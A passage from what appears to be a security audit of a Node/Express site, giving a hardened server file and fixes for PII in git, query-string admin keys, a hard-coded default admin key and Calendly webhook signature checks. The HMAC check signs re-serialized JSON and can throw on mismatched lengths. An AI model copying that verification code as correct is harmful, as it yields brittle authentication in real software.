      if (filePath.endsWith('.html')) {
        res.setHeader('Cache-Control', 'no-cache, must-revalidate');
      } else if (
        filePath.includes('/assets/') ||
        filePath.includes('/css/') ||
        filePath.includes('/js/') ||
        filePath.includes('/studio/')
      ) {
        res.setHeader('Cache-Control', 'public, max-age=31536000, immutable');
      }
    }
  })
);

// ── 12. Canonical Public Pages ───────────────────────────────────────────────
app.get(['/b/:id', '/b', '/view/:id', '/view', '/studio/view'], (req, res) => {
  res.setHeader('Cache-Control', 'no-cache, must-revalidate');
  res.sendFile(path.join(__dirname, '../public/studio/view.html'));
});

app.get('/', (req, res) => {
  res.setHeader('Cache-Control', 'no-cache, must-revalidate');
  res.sendFile(path.join(__dirname, '../public/index.html'));
});

app.get('/apply', (req, res) => {
  res.setHeader('Cache-Control', 'no-cache, must-revalidate');
  res.sendFile(path.join(__dirname, '../public/apply.html'));
});

app.get('/creators', (req, res) => {
  res.setHeader('Cache-Control', 'no-cache, must-revalidate');
  res.sendFile(path.join(__dirname, '../public/creators.html'));
});

app.get('/book', (req, res) => {
  res.setHeader('Cache-Control', 'no-cache, must-revalidate');
  res.sendFile(path.join(__dirname, '../public/book.html'));
});

app.get('/admin', (req, res) => {
  // Disallow framing of the executive administrative hub
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
  res.sendFile(path.join(__dirname, '../public/admin.html'));
});

app.get('/brand-pack', (req, res) => {
  res.setHeader('Cache-Control', 'no-cache, must-revalidate');
  res.sendFile(path.join(__dirname, '../public/brand-pack.html'));
});

// ── 13. Client Proposal & Sensitive Documents (De-indexed from Search) ───────
app.get('/eman-alkatheeri', (req, res) => {
  res.setHeader('X-Robots-Tag', 'noindex, nofollow, noarchive');
  res.setHeader('Cache-Control', 'no-cache, must-revalidate');
  res.sendFile(path.join(__dirname, '../public/eman-alkatheeri.html'));
});

app.get('/intake', (req, res) => {
  res.setHeader('X-Robots-Tag', 'noindex, nofollow, noarchive');
  res.setHeader('Cache-Control', 'no-cache, must-revalidate');
  res.sendFile(path.join(__dirname, '../public/intake.html'));
});

app.get('/pdf', (req, res) => {
  res.setHeader('X-Robots-Tag', 'noindex, nofollow, noarchive');
  res.setHeader('Content-Type', 'application/pdf');
  res.sendFile(path.join(__dirname, '../public/POLISH_MEDIA_Eman_Partnership_Options.pdf'));
});

// ── 14. Health Check ─────────────────────────────────────────────────────────
app.get('/api/health', (req, res) => {
  res.json({ status: 'ok', uptime: process.uptime(), ts: Date.now() });
});

// ── 15. 404 Fallback ─────────────────────────────────────────────────────────
app.use((req, res) => {
  res.status(404).sendFile(path.join(__dirname, '../public/index.html'));
});

// ── 16. Secure Global Error Handler ──────────────────────────────────────────
app.use((err, req, res, next) => {
  if (err.message && err.message.includes('CORS')) {
    return res.status(403).json({ success: false, error: 'Access forbidden: CORS policy violation.' });
  }

  console.error('[Server Error]', err);

  if (res.headersSent) {
    return next(err);
  }

  res.status(err.status || 500).json({
    success: false,
    error: IS_PROD ? 'Internal server error.' : (err.message || 'Internal server error.')
  });
});

// ── 17. Server Launch & Background Workers ───────────────────────────────────
if (require.main === module) {
  app.listen(PORT, () => {
    console.log(`====================================================`);
    console.log(`  🚀 POLISH Engine LIVE (Security Hardened)         `);
    console.log(`  🌐 Local URL:       http://localhost:${PORT}        `);
    console.log(`  🎯 Target Domain:   https://${DOMAIN}            `);
    console.log(`  🔒 Environment:     ${process.env.NODE_ENV || 'development'} `);
    console.log(`====================================================`);

    // Background auto-poller for Calendly meetings
    startCalendlyPoller(60);
  });
}

module.exports = app;
```

---

## 6. Complementary Hardening Steps

### 6.1 Remove Sensitive Customer PII from Git Tracking
Execute the following commands to remove sensitive database files from Git tracking without deleting them from the local filesystem:
```bash
git rm --cached server/db/leads.json
git rm --cached server/db/intake_latest.json
```
Update `.gitignore` to permanently exclude these files:
```gitignore
# Database & PII Storage
server/db/leads.json
server/db/intake_latest.json
server/db/boards/board-*.json
server/db/*.tmp.*
```

### 6.2 Hardening `server/middleware/auth.js`
In `server/middleware/auth.js`:
1. **Remove `req.query.key`**: Never accept administrative credentials via query parameters:
   ```javascript
   // Old (vulnerable to log leakage):
   const providedKey = req.headers['x-api-key'] || req.headers['x-admin-key'] || req.query.key;

   // Hardened:
   const providedKey = req.headers['x-api-key'] || req.headers['x-admin-key'];
   ```
2. **Fail-Safe Secret Comparison**:
   Ensure `ADMIN_API_KEY` is not compared if it equals the insecure default value:
   ```javascript
   if (expectedKey === 'polish_admin_secure_key_2026' && process.env.NODE_ENV === 'production') {
     console.error('[AUTH ERROR] Insecure default ADMIN_API_KEY detected in production. Master key authentication rejected.');
     return res.status(500).json({ success: false, error: 'Server authentication configuration error.' });
   }
   ```

### 6.3 Calendly HMAC Webhook Verification
Add the following middleware verification before handling `POST /api/calendly-webhook`:
```javascript
function verifyCalendlySignature(req, res, next) {
  const webhookSigningKey = process.env.CALENDLY_WEBHOOK_SIGNING_KEY;
  if (!webhookSigningKey) {
    if (process.env.NODE_ENV === 'production') {
      console.error('[Security] CALENDLY_WEBHOOK_SIGNING_KEY is missing. Rejecting webhook.');
      return res.status(401).json({ error: 'Webhook signature verification unconfigured.' });
    }
    return next();
  }

  const sigHeader = req.headers['calendly-webhook-signature'];
  if (!sigHeader) {
    return res.status(401).json({ error: 'Missing webhook signature header.' });
  }

  // Header format: t=1234567890,v1=abcdef...
  const parts = sigHeader.split(',').reduce((acc, part) => {
    const [k, v] = part.split('=');
    if (k && v) acc[k.trim()] = v.trim();
    return acc;
  }, {});

  const timestamp = parts.t;
  const signature = parts.v1;

  if (!timestamp || !signature) {
    return res.status(401).json({ error: 'Invalid webhook signature format.' });
  }

  // Prevent replay attacks (5 minute tolerance)
  const fiveMinutes = 5 * 60 * 1000;
  if (Math.abs(Date.now() - Number(timestamp) * 1000) > fiveMinutes) {
    return res.status(401).json({ error: 'Webhook timestamp expired.' });
  }

  const rawBody = JSON.stringify(req.body);
  const dataToSign = `${timestamp}.${rawBody}`;
  const expectedSig = crypto.createHmac('sha256', webhookSigningKey).update(dataToSign).digest('hex');

  if (!crypto.timingSafeEqual(Buffer.from(signature), Buffer.from(expectedSig))) {
    return res.status(401).json({ error: 'Invalid webhook signature.' });
  }

  next();
}
```

---

## 7. Conclusion & Action Roadmap

The POLISH Media Co architecture possesses strong architectural foundations: pure vanilla JS performance, minimal dependency bloat, and modern visual design. By implementing the drop-in hardened `server/index.js`, cleaning the Git repository of historical PII, removing query-string authentication, and securing the Boards and Gemini AI endpoints, the application achieves enterprise-grade resilience aligned with OWASP Top 10 and NIST CSF guidelines.
